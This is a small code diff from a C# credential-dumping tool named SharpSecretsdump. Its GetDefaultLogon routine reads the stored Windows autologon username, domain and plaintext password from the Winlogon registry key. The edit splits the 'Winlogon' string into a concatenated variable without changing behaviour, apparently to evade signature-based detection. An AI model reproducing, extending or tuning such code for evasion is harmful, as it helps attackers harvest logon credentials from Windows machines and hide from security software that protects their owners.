@@ -106,9 +106,10 @@ namespace SharpSecretsdump
 
         public static void GetDefaultLogon()
         {
-            byte[] usernameArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultUserName", true);
-            byte[] domainArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultDomainName", true);
-            byte[] passwordArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultPassword", true);
+            string key = "Winlogon";
+            byte[] usernameArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\" + key, "DefaultUserName", true);
+            byte[] domainArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\" + key, "DefaultDomainName", true);
+            byte[] passwordArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\" + key, "DefaultPassword", true);
             string username;
             if (usernameArr != null)
             {
